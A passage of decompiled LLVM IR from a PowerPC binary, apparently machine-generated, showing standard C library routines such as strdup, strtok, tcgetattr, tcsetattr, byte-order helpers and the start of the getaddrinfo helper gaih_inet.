  store i32 %v3_1001c4a0, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001c4a8

dec_label_pc_1001c4a8:                            ; preds = %dec_label_pc_1001c4a8.backedge, %entry
  %v0_1001c4a8 = phi i32 [ %v0_1001c4a8.pre, %dec_label_pc_1001c4a8.backedge ], [ %arg2, %entry ]
  %v1_1001c4a8 = inttoptr i32 %v0_1001c4a8 to i8*
  %v2_1001c4a8 = load i8, i8* %v1_1001c4a8, align 1
  %v3_1001c4a8 = zext i8 %v2_1001c4a8 to i32
  store i32 %v3_1001c4a8, i32* %r0.global-to-local, align 4
  %v1_1001c4ac = add i32 %v0_1001c4a8, 1
  store i32 %v1_1001c4ac, i32* %r10.global-to-local, align 4
  %v3_1001c4b0 = icmp eq i8 %v2_1001c4a8, 0
  %v1_1001c4b4 = mul nuw nsw i32 %v3_1001c4a8, 2
  store i32 %v1_1001c4b4, i32* %r9.global-to-local, align 4
  %v0_1001c4b8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001c4b0, i32 %v0_1001c4b8)
  %v0_1001c4bc = load i32, i32* %r8.global-to-local, align 4
  %v1_1001c4bc = inttoptr i32 %v0_1001c4bc to i8*
  %v2_1001c4bc = load i8, i8* %v1_1001c4bc, align 1
  %v3_1001c4bc = zext i8 %v2_1001c4bc to i32
  %v1_1001c4c0 = add i32 %v0_1001c4bc, 1
  store i32 %v1_1001c4c0, i32* %r8.global-to-local, align 4
  %v0_1001c4c4 = load i32, i32* %r0.global-to-local, align 4
  %v4_1001c4c4 = icmp eq i32 %v0_1001c4c4, %v3_1001c4bc
  br i1 %v4_1001c4c4, label %dec_label_pc_1001c4a8.backedge, label %dec_label_pc_1001c4d0

dec_label_pc_1001c4a8.backedge:                   ; preds = %dec_label_pc_1001c4a8, %dec_label_pc_1001c4d0, %dec_label_pc_1001c4e4
  %v0_1001c4a8.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001c4a8

dec_label_pc_1001c4d0:                            ; preds = %dec_label_pc_1001c4a8
  %v1_1001c4c8 = mul nuw nsw i32 %v3_1001c4bc, 2
  %v0_1001c4d0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001c4d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1001c4d0 = add i32 %v1_1001c4d0, %v0_1001c4d0
  %v3_1001c4d0 = inttoptr i32 %v2_1001c4d0 to i16*
  %v4_1001c4d0 = load i16, i16* %v3_1001c4d0, align 2
  %v5_1001c4d0 = sext i16 %v4_1001c4d0 to i32
  store i32 %v5_1001c4d0, i32* %r9.global-to-local, align 4
  %v2_1001c4d8 = add i32 %v1_1001c4d0, %v1_1001c4c8
  %v3_1001c4d8 = inttoptr i32 %v2_1001c4d8 to i16*
  %v4_1001c4d8 = load i16, i16* %v3_1001c4d8, align 2
  %v5_1001c4d8 = sext i16 %v4_1001c4d8 to i32
  store i32 %v5_1001c4d8, i32* %r0.global-to-local, align 4
  %v4_1001c4dc = icmp eq i16 %v4_1001c4d0, %v4_1001c4d8
  br i1 %v4_1001c4dc, label %dec_label_pc_1001c4a8.backedge, label %dec_label_pc_1001c4e4

dec_label_pc_1001c4e4:                            ; preds = %dec_label_pc_1001c4d0
  %v3_1001c4d4 = icmp eq i8 %v2_1001c4bc, 0
  %v0_1001c4e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1001c4e4 = add i32 %v0_1001c4e4, 1
  store i32 %v1_1001c4e4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  store i32 %v1_1001c4e4, i32* %r8.global-to-local, align 4
  br i1 %v3_1001c4d4, label %dec_label_pc_1001c4f4, label %dec_label_pc_1001c4a8.backedge

dec_label_pc_1001c4f4:                            ; preds = %dec_label_pc_1001c4e4
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1001c4a8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001c4a8.backedge, { 2, 1, 0 }
}

define i32 @__GI_strdup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_1001c510 = call i32 @__GI_strlen()
  %v1_1001c514 = add i32 %v0_1001c510, 1
  store i32 %v1_1001c514, i32* @r29, align 4
  store i32 %v1_1001c514, i32* @r3, align 4
  store i32 268551456, i32* @lr, align 4
  %v0_1001c51c = call i32 @malloc()
  store i32 %v0_1001c51c, i32* @r3, align 4
  %v0_1001c520 = load i32, i32* @r28, align 4
  store i32 %v0_1001c520, i32* @r4, align 4
  store i32 %v0_1001c51c, i32* @r31, align 4
  %v3_1001c524 = icmp eq i32 %v0_1001c51c, 0
  %v0_1001c528 = load i32, i32* @r29, align 4
  store i32 %v0_1001c528, i32* @r5, align 4
  br i1 %v3_1001c524, label %dec_label_pc_1001c534, label %dec_label_pc_1001c530

dec_label_pc_1001c530:                            ; preds = %entry
  store i32 268551476, i32* @lr, align 4
  %v0_1001c530 = call i32 @memcpy()
  %v0_1001c538.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001c534

dec_label_pc_1001c534:                            ; preds = %entry, %dec_label_pc_1001c530
  %v0_1001c538 = phi i32 [ 0, %entry ], [ %v0_1001c538.pre, %dec_label_pc_1001c530 ]
  ret i32 %v0_1001c538

; uselistorder directives
  uselistorder label %dec_label_pc_1001c534, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10045240.1187 to i32), i32* @r5, align 4
  %v1_1001c554 = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_10045240.1187 to i32))
  ret i32 %v1_1001c554
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268551532, i32* @lr, align 4
  %v2_1001c568 = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @__libc_tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  store i32 1, i32* @r5, align 4
  store i32 536900637, i32* @r4, align 4
  %v0_1001c594 = call i32 @ioctl()
  ret i32 %v0_1001c594
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_4()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1001c59c = load i32, i32* @lr, align 4
  store i32 %v0_1001c59c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1001c5ac = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1001c5ac, i32* @r5, align 4
  store i32 1076655123, i32* @r4, align 4
  store i32 268551616, i32* @lr, align 4
  %v0_1001c5bc = call i32 @ioctl()
  %v2_1001c5c0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1001c5c0, i32* @r4, align 4
  store i32 %v0_1001c5bc, i32* @r30, align 4
  %v3_1001c5c4 = icmp eq i32 %v0_1001c5bc, 0
  store i32 19, i32* @r5, align 4
  %v0_1001c5cc = load i32, i32* @r31, align 4
  br i1 %v3_1001c5c4, label %dec_label_pc_1001c5d4, label %dec_label_pc_1001c61c

dec_label_pc_1001c5d4:                            ; preds = %entry
  %v1_1001c5cc = add i32 %v0_1001c5cc, 17
  %v4_1001c5e0 = zext i8 %tmp4 to i32
  store i32 %v4_1001c5e0, i32* @r8, align 4
  %v3_1001c5ec = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1001c5ec, i32* %r0.global-to-local, align 4
  %v2_1001c5f0 = add i32 %v0_1001c5cc, 4
  %v3_1001c5f0 = inttoptr i32 %v2_1001c5f0 to i32*
  store i32 %tmp7, i32* %v3_1001c5f0, align 4
  %v0_1001c5f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001c5f4 = load i32, i32* @r31, align 4
  %v2_1001c5f4 = inttoptr i32 %v1_1001c5f4 to i32*
  store i32 %v0_1001c5f4, i32* %v2_1001c5f4, align 4
  %v0_1001c5f8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001c5f8 = load i32, i32* @r31, align 4
  %v2_1001c5f8 = add i32 %v1_1001c5f8, 8
  %v3_1001c5f8 = inttoptr i32 %v2_1001c5f8 to i32*
  store i32 %v0_1001c5f8, i32* %v3_1001c5f8, align 4
  %v0_1001c5fc = load i32, i32* %r10.global-to-local, align 4
  %v1_1001c5fc = load i32, i32* @r31, align 4
  %v2_1001c5fc = add i32 %v1_1001c5fc, 12
  %v3_1001c5fc = inttoptr i32 %v2_1001c5fc to i32*
  store i32 %v0_1001c5fc, i32* %v3_1001c5fc, align 4
  %v3_1001c600 = load i32, i32* @r31, align 4
  %v4_1001c600 = add i32 %v3_1001c600, 16
  %v5_1001c600 = inttoptr i32 %v4_1001c600 to i8*
  store i8 %tmp4, i8* %v5_1001c600, align 1
  %v1_1001c604 = load i32, i32* @r31, align 4
  %v2_1001c604 = add i32 %v1_1001c604, 52
  %v3_1001c604 = inttoptr i32 %v2_1001c604 to i32*
  store i32 %tmp3, i32* %v3_1001c604, align 4
  %v1_1001c608 = load i32, i32* @r31, align 4
  %v2_1001c608 = add i32 %v1_1001c608, 56
  %v3_1001c608 = inttoptr i32 %v2_1001c608 to i32*
  store i32 %tmp2, i32* %v3_1001c608, align 4
  store i32 268551696, i32* @lr, align 4
  %v6_1001c60c = sext i8 %tmp4 to i32
  %v8_1001c60c = call i32 @__GI_mempcpy(i32 %v1_1001c5cc, i32 %v2_1001c5c0, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1001c60c, i32 %tmp7)
  store i32 %v8_1001c60c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 13, i32* @r5, align 4
  store i32 268551708, i32* @lr, align 4
  %v0_1001c618 = call i32 @__GI_memset()
  %v0_1001c620.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001c61c

dec_label_pc_1001c61c:                            ; preds = %entry, %dec_label_pc_1001c5d4
  %v0_1001c620 = phi i32 [ %v0_1001c5bc, %entry ], [ %v0_1001c620.pre, %dec_label_pc_1001c5d4 ]
  store i32 %v0_1001c59c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001c620

; uselistorder directives
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i8 %tmp4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001c61c, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1001c634 = load i32, i32* @r4, align 4
  %v3_1001c634 = icmp eq i32 %v0_1001c634, 1
  %v0_1001c644 = load i32, i32* @r3, align 4
  store i32 %v0_1001c644, i32* @r27, align 4
  %v0_1001c64c = load i32, i32* @r5, align 4
  store i32 %v0_1001c64c, i32* @r31, align 4
  br i1 %v3_1001c634, label %dec_label_pc_1001c670, label %dec_label_pc_1001c654

dec_label_pc_1001c654:                            ; preds = %entry
  %v3_1001c654 = icmp eq i32 %v0_1001c634, 2
  br i1 %v3_1001c654, label %dec_label_pc_1001c690, label %dec_label_pc_1001c65c

dec_label_pc_1001c65c:                            ; preds = %dec_label_pc_1001c654
  %v3_1001c65c = icmp eq i32 %v0_1001c634, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1001c65c, label %dec_label_pc_1001c698, label %dec_label_pc_1001c67c

dec_label_pc_1001c670:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1001c698

dec_label_pc_1001c67c:                            ; preds = %dec_label_pc_1001c65c
  %v0_1001c67c = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_1001c688 = inttoptr i32 %v0_1001c67c to i32*
  store i32 22, i32* %v2_1001c688, align 4
  br label %dec_label_pc_1001c780

dec_label_pc_1001c690:                            ; preds = %dec_label_pc_1001c654
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1001c698

dec_label_pc_1001c698:                            ; preds = %dec_label_pc_1001c65c, %dec_label_pc_1001c670, %dec_label_pc_1001c690
  %v1_1001c698 = inttoptr i32 %v0_1001c64c to i32*
  %v2_1001c698 = load i32, i32* %v1_1001c698, align 4
  store i32 19, i32* @r5, align 4
  %v1_1001c6a0 = add i32 %v0_1001c64c, 4
  %v2_1001c6a0 = inttoptr i32 %v1_1001c6a0 to i32*
  %v3_1001c6a0 = load i32, i32* %v2_1001c6a0, align 4
  store i32 %v3_1001c6a0, i32* %r9.global-to-local, align 4
  %v1_1001c6a4 = add i32 %v0_1001c64c, 17
  store i32 %v1_1001c6a4, i32* @r4, align 4
  %v1_1001c6a8 = add i32 %v0_1001c64c, 8
  %v2_1001c6a8 = inttoptr i32 %v1_1001c6a8 to i32*
  %v3_1001c6a8 = load i32, i32* %v2_1001c6a8, align 4
  %v2_1001c6ac = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1001c6ac, i32* @r3, align 4
  %v2_1001c6b4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1001c6b4, i32* @r26, align 4
  %v1_1001c6b8 = add i32 %v0_1001c64c, 16
  %v2_1001c6b8 = inttoptr i32 %v1_1001c6b8 to i8*
  %v3_1001c6b8 = load i8, i8* %v2_1001c6b8, align 1
  %v4_1001c6b8 = zext i8 %v3_1001c6b8 to i32
  store i32 %v4_1001c6b8, i32* @r8, align 4
  store i32 %v2_1001c698, i32* %stack_var_-72, align 4
  store i32 268551908, i32* @lr, align 4
  %v0_1001c6e0 = call i32 @memcpy()
  %v0_1001c6e4 = load i32, i32* @r27, align 4
  store i32 %v0_1001c6e4, i32* @r3, align 4
  %v0_1001c6e8 = load i32, i32* @r30, align 4
  store i32 %v0_1001c6e8, i32* @r4, align 4
  store i32 %v2_1001c6b4, i32* @r5, align 4
  store i32 268551928, i32* @lr, align 4
  %v0_1001c6f4 = call i32 @ioctl()
  store i32 %v0_1001c6f4, i32* @r28, align 4
  %v3_1001c6f8 = icmp eq i32 %v0_1001c6f4, 0
  br i1 %v3_1001c6f8, label %dec_label_pc_1001c700, label %dec_label_pc_1001c780

dec_label_pc_1001c700:                            ; preds = %dec_label_pc_1001c698
  %v0_1001c700 = load i32, i32* @r30, align 4
  %v3_1001c704 = icmp eq i32 %v0_1001c700, -2144570348
  br i1 %v3_1001c704, label %dec_label_pc_1001c70c, label %dec_label_pc_1001c77c

dec_label_pc_1001c70c:                            ; preds = %dec_label_pc_1001c700
  %v0_1001c70c = call i32 @__errno_location()
  store i32 %v0_1001c70c, i32* @r29, align 4
  store i32 1076655123, i32* @r4, align 4
  %v0_1001c71c = load i32, i32* @r27, align 4
  store i32 %v0_1001c71c, i32* @r3, align 4
  store i32 %v2_1001c6b4, i32* @r5, align 4
  %v1_1001c724 = inttoptr i32 %v0_1001c70c to i32*
  %v2_1001c724 = load i32, i32* %v1_1001c724, align 4
  store i32 %v2_1001c724, i32* @r30, align 4
  store i32 268551984, i32* @lr, align 4
  %v0_1001c72c = call i32 @ioctl()
  %v3_1001c730 = icmp eq i32 %v0_1001c72c, 0
  br i1 %v3_1001c730, label %dec_label_pc_1001c740, label %dec_label_pc_1001c738

dec_label_pc_1001c738:                            ; preds = %dec_label_pc_1001c70c
  %v0_1001c738 = load i32, i32* @r30, align 4
  %v1_1001c738 = load i32, i32* @r29, align 4
  %v2_1001c738 = inttoptr i32 %v1_1001c738 to i32*
  store i32 %v0_1001c738, i32* %v2_1001c738, align 4
  br label %dec_label_pc_1001c780

dec_label_pc_1001c740:                            ; preds = %dec_label_pc_1001c70c
  %v0_1001c740 = load i32, i32* @r31, align 4
  %v1_1001c740 = add i32 %v0_1001c740, 8
  %v2_1001c740 = inttoptr i32 %v1_1001c740 to i32*
  %v3_1001c740 = load i32, i32* %v2_1001c740, align 4
  %v1_1001c748 = call i32 @__asm_rlwinm(i32 %v3_1001c740, i32 0, i32 19, i32 20)
  %v1_1001c74c = call i32 @__asm_rlwinm(i32 %v3_1001c6a8, i32 0, i32 19, i32 20)
  store i32 %v1_1001c74c, i32* %r9.global-to-local, align 4
  %v4_1001c750 = icmp eq i32 %v1_1001c748, %v1_1001c74c
  br i1 %v4_1001c750, label %dec_label_pc_1001c758, label %dec_label_pc_1001c76c

dec_label_pc_1001c758:                            ; preds = %dec_label_pc_1001c740
  %v1_1001c758 = and i32 %v3_1001c740, 768
  store i32 %v1_1001c758, i32* %r9.global-to-local, align 4
  %v3_1001c758 = icmp eq i32 %v1_1001c758, 0
  br i1 %v3_1001c758, label %dec_label_pc_1001c77c, label %dec_label_pc_1001c760

dec_label_pc_1001c760:                            ; preds = %dec_label_pc_1001c758
  %v1_1001c760 = call i32 @__asm_rlwinm(i32 %v3_1001c6a8, i32 0, i32 22, i32 23)
  %v0_1001c764 = load i32, i32* %r9.global-to-local, align 4
  %v4_1001c764 = icmp eq i32 %v0_1001c764, %v1_1001c760
  br i1 %v4_1001c764, label %dec_label_pc_1001c77c, label %dec_label_pc_1001c76c

dec_label_pc_1001c76c:                            ; preds = %dec_label_pc_1001c740, %dec_label_pc_1001c760
  store i32 -1, i32* @r28, align 4
  %v1_1001c774 = load i32, i32* @r29, align 4
  %v2_1001c774 = inttoptr i32 %v1_1001c774 to i32*
  store i32 22, i32* %v2_1001c774, align 4
  br label %dec_label_pc_1001c780

dec_label_pc_1001c77c:                            ; preds = %dec_label_pc_1001c700, %dec_label_pc_1001c760, %dec_label_pc_1001c758
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1001c780

dec_label_pc_1001c780:                            ; preds = %dec_label_pc_1001c698, %dec_label_pc_1001c76c, %dec_label_pc_1001c67c, %dec_label_pc_1001c738, %dec_label_pc_1001c77c
  %v0_1001c784 = load i32, i32* @r28, align 4
  ret i32 %v0_1001c784

; uselistorder directives
  uselistorder i32 %v0_1001c64c, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1001c780, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_1001c77c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001c76c, { 1, 0 }
  uselistorder label %dec_label_pc_1001c698, { 2, 1, 0 }
}

define i32 @ntohl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1001c798 = load i32, i32* @r3, align 4
  ret i32 %v0_1001c798
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_1001c79c = load i32, i32* @r3, align 4
  ret i32 %v0_1001c79c
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1001c7a0 = load i32, i32* @r3, align 4
  ret i32 %v0_1001c7a0
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1001c7a4 = load i32, i32* @r3, align 4
  ret i32 %v0_1001c7a4
}

define i32 @gaih_inet_serv(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1001c7ac = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1001c7ac, i32* %stack_var_-64, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_1001c7c0 = load i32, i32* @r4, align 4
  store i32 %v0_1001c7c0, i32* @r30, align 4
  store i32 1024, i32* @r28, align 4
  %v2_1001c7f0 = ptrtoint i32* %stack_var_-52 to i32
  %v2_1001c7f4 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_1001c7d0

dec_label_pc_1001c7d0:                            ; preds = %dec_label_pc_1001c824.dec_label_pc_1001c7d0_crit_edge, %entry
  %v2_1001c7d4 = phi i32 [ %v2_1001c7d4.pre, %dec_label_pc_1001c824.dec_label_pc_1001c7d0_crit_edge ], [ %v4_1001c7ac, %entry ]
  %v0_1001c7d0 = phi i32 [ %v0_1001c7d0.pre, %dec_label_pc_1001c824.dec_label_pc_1001c7d0_crit_edge ], [ 1024, %entry ]
  %v1_1001c7d0 = add i32 %v0_1001c7d0, 30
  %v1_1001c7d8 = call i32 @__asm_rlwinm(i32 %v1_1001c7d0, i32 0, i32 0, i32 27)
  %v0_1001c7dc = load i32, i32* @r28, align 4
  store i32 %v0_1001c7dc, i32* @r7, align 4
  %v0_1001c7e4 = load i32, i32* @r27, align 4
  store i32 %v0_1001c7e4, i32* %r3.global-to-local, align 4
  %v1_1001c7e8 = load i32, i32* @r1, align 4
  %v3_1001c7e8 = sub i32 %v1_1001c7e8, %v1_1001c7d8
  %v4_1001c7e8 = inttoptr i32 %v3_1001c7e8 to i32*
  store i32 %v2_1001c7d4, i32* %v4_1001c7e8, align 4
  %v0_1001c7ec = load i32, i32* @r30, align 4
  %v1_1001c7ec = add i32 %v0_1001c7ec, 3
  store i32 %v1_1001c7ec, i32* @r4, align 4
  store i32 %v2_1001c7f0, i32* @r5, align 4
  store i32 %v2_1001c7f4, i32* @r8, align 4
  %v1_1001c7f8 = add i32 %v3_1001c7e8, 23
  %v1_1001c800 = call i32 @__asm_rlwinm(i32 %v1_1001c7f8, i32 0, i32 0, i32 27)
  store i32 %v1_1001c800, i32* @r6, align 4
  store i32 268552200, i32* @lr, align 4
  %v1_1001c804 = call i32 @getservbyname_r(i32 %v1_1001c800)
  store i32 %v1_1001c804, i32* %r3.global-to-local, align 4
  %v3_1001c808 = icmp eq i32 %v1_1001c804, 0
  br i1 %v3_1001c808, label %dec_label_pc_1001c814, label %dec_label_pc_1001c824

dec_label_pc_1001c814:                            ; preds = %dec_label_pc_1001c7d0
  %v3_1001c814 = load i32, i32* %stack_var_-56, align 4
  %v3_1001c818 = icmp eq i32 %v3_1001c814, 0
  br i1 %v3_1001c818, label %dec_label_pc_1001c854, label %dec_label_pc_1001c82c

dec_label_pc_1001c824:                            ; preds = %dec_label_pc_1001c7d0
  %v3_1001c80c = icmp eq i32 %v1_1001c804, 34
  br i1 %v3_1001c80c, label %dec_label_pc_1001c824.dec_label_pc_1001c7d0_crit_edge, label %dec_label_pc_1001c854

dec_label_pc_1001c824.dec_label_pc_1001c7d0_crit_edge: ; preds = %dec_label_pc_1001c824
  %v0_1001c7d0.pre = load i32, i32* @r28, align 4
  %v2_1001c7d4.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_1001c7d0

dec_label_pc_1001c82c:                            ; preds = %dec_label_pc_1001c814
  %v1_1001c830 = load i32, i32* @r29, align 4
  %v2_1001c830 = inttoptr i32 %v1_1001c830 to i32*
  store i32 0, i32* %v2_1001c830, align 4
  %v0_1001c834 = load i32, i32* @r30, align 4
  %v1_1001c834 = inttoptr i32 %v0_1001c834 to i8*
  %v2_1001c834 = load i8, i8* %v1_1001c834, align 1
  %v2_1001c838 = sext i8 %v2_1001c834 to i32
  %v1_1001c83c = load i32, i32* @r29, align 4
  %v2_1001c83c = add i32 %v1_1001c83c, 4
  %v3_1001c83c = inttoptr i32 %v2_1001c83c to i32*
  store i32 %v2_1001c838, i32* %v3_1001c83c, align 4
  %v0_1001c840 = load i32, i32* @r30, align 4
  %v1_1001c840 = add i32 %v0_1001c840, 2
  %v2_1001c840 = inttoptr i32 %v1_1001c840 to i8*
  %v3_1001c840 = load i8, i8* %v2_1001c840, align 1
  %v1_1001c844 = and i8 %v3_1001c840, 2
  %v3_1001c844 = icmp eq i8 %v1_1001c844, 0
  br i1 %v3_1001c844, label %dec_label_pc_1001c85c, label %dec_label_pc_1001c84c

dec_label_pc_1001c84c:                            ; preds = %dec_label_pc_1001c82c
  %v0_1001c84c = load i32, i32* @r26, align 4
  %v1_1001c84c = add i32 %v0_1001c84c, 12
  %v2_1001c84c = inttoptr i32 %v1_1001c84c to i32*
  %v3_1001c84c = load i32, i32* %v2_1001c84c, align 4
  br label %dec_label_pc_1001c864

dec_label_pc_1001c854:                            ; preds = %dec_label_pc_1001c824, %dec_label_pc_1001c814
  store i32 264, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001c878

dec_label_pc_1001c85c:                            ; preds = %dec_label_pc_1001c82c
  %v1_1001c85c = add i32 %v0_1001c840, 1
  %v2_1001c85c = inttoptr i32 %v1_1001c85c to i8*
  %v3_1001c85c = load i8, i8* %v2_1001c85c, align 1
  %v2_1001c860 = sext i8 %v3_1001c85c to i32
  br label %dec_label_pc_1001c864

dec_label_pc_1001c864:                            ; preds = %dec_label_pc_1001c84c, %dec_label_pc_1001c85c
  %storemerge = phi i32 [ %v3_1001c84c, %dec_label_pc_1001c84c ], [ %v2_1001c860, %dec_label_pc_1001c85c ]
  %v1_1001c864 = load i32, i32* @r29, align 4
  %v2_1001c864 = add i32 %v1_1001c864, 8
  %v3_1001c864 = inttoptr i32 %v2_1001c864 to i32*
  store i32 %storemerge, i32* %v3_1001c864, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_1001c86c = load i32, i32* %stack_var_-56, align 4
  %v1_1001c870 = add i32 %v3_1001c86c, 8
  %v2_1001c870 = inttoptr i32 %v1_1001c870 to i32*
  %v3_1001c870 = load i32, i32* %v2_1001c870, align 4
  %v1_1001c874 = load i32, i32* @r29, align 4
  %v2_1001c874 = add i32 %v1_1001c874, 12
  %v3_1001c874 = inttoptr i32 %v2_1001c874 to i32*
  store i32 %v3_1001c870, i32* %v3_1001c874, align 4
  %v0_1001c88c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001c878

dec_label_pc_1001c878:                            ; preds = %dec_label_pc_1001c854, %dec_label_pc_1001c864
  %v0_1001c88c = phi i32 [ 264, %dec_label_pc_1001c854 ], [ %v0_1001c88c.pre, %dec_label_pc_1001c864 ]
  ret i32 %v0_1001c88c

; uselistorder directives
  uselistorder label %dec_label_pc_1001c878, { 1, 0 }
  uselistorder label %dec_label_pc_1001c864, { 1, 0 }
}

define i32 @gaih_inet(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-281 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-156 = alloca i8*, align 4
  %stack_var_-233 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-185 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1001c894 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1001c894, i32* %stack_var_-176, align 4
  %v5_1001c894 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v5_1001c894, i32* @r31, align 4
  %v2_1001c8a4 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_1001c8a4, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r27, align 4
  store i32 %arg1, i32* @r24, align 4
  %v1_1001c8b0 = add i32 %arg3, 4
  %v2_1001c8b0 = inttoptr i32 %v1_1001c8b0 to i32*
  %v3_1001c8b0 = load i32, i32* %v2_1001c8b0, align 4
  store i32 %v3_1001c8b0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %v2_1001c8a4, i32* %stack_var_-168, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1001c8c0 = icmp eq i32 %v3_1001c8b0, 0
  store i32 0, i32* %stack_var_-164, align 4
  store i32 %arg4, i32* @r25, align 4
  br i1 %v3_1001c8c0, label %dec_label_pc_1001c8dc, label %dec_label_pc_1001c8d0

dec_label_pc_1001c8d0:                            ; preds = %entry
  %v3_1001c8d0 = icmp eq i32 %v3_1001c8b0, 10
  store i32 0, i32* @r21, align 4
  br i1 %v3_1001c8d0, label %dec_label_pc_1001c8dc, label %dec_label_pc_1001c8e4

dec_label_pc_1001c8dc:                            ; preds = %dec_label_pc_1001c8d0, %entry
  %v1_1001c8dc = inttoptr i32 %arg3 to i32*
  %v2_1001c8dc = load i32, i32* %v1_1001c8dc, align 4
  store i32 %v2_1001c8dc, i32* %r0.global-to-local, align 4
  %v1_1001c8e0 = call i32 @__asm_rlwinm(i32 %v2_1001c8dc, i32 29, i32 31, i32 31)
